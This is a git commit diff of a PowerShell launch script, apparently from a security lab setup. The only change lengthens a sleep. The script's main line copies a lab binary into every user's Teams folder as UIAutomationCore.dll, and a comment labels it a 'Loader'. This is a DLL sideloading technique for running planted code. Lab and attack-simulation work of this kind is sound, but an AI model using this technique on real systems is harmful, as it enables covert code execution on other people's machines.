1cfa392b4e7b4e3a7157c8e19cc79952b66ee184
elusivethreat <68078458+elusivethreat@users.noreply.github.com>
2024-01-03 19:47:58 +0000

    Update Launch.ps1

--- Launch.ps1
+++ Launch.ps1
@@ -1,6 +1,6 @@
 # Init Folders
 Start-Job -ScriptBlock { Start-Process -PSPath 'C:\Program Files (x86)\Teams Installer\Teams.exe' }
-Start-Sleep -Seconds 5
+Start-Sleep -Seconds 30
 
 # Transfer files into install dir
 Get-ChildItem "C:\Users" | ForEach-Object { Copy-Item "C:\Users\Public\Desktop\LAB_FILES\MS_Plugin\FirstHook\LunarUI.bin" $_"\AppData\Local\Microsoft\Teams\UIAutomationCore.dll" } # Loader
